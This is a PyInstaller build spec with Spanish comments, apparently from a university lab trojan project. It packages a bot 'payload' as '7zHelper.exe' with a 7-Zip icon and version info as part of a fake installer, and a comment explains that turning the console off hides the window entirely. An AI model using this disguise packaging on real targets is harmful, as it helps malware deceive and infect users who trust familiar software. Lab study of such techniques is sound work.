# -*- mode: python ; coding: utf-8 -*-
# Spec de PyInstaller del payload del laboratorio, empaquetado como
# "7zHelper.exe" (parte de la capa de disfraz del instalador 7-Zip).
# Compilar desde troyano/:
#   python -m PyInstaller pyinstaller/AgenteUTN.spec --noconfirm

from pathlib import Path

ROOT = Path(SPECPATH).parent
SRC = ROOT / "src"
ICON = ROOT / "assets" / "7z.ico"
VERSION_INFO = ROOT / "pyinstaller" / "version_info.txt"

a = Analysis(
    [str(SRC / "main.py")],
    pathex=[str(SRC)],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name="7zHelper",
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    # Para el laboratorio se deja console=True (se ve la salida del zombie).
    # Cambiar a console=False oculta la ventana por completo (disfraz total).
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=str(ICON),
    version=str(VERSION_INFO),
)
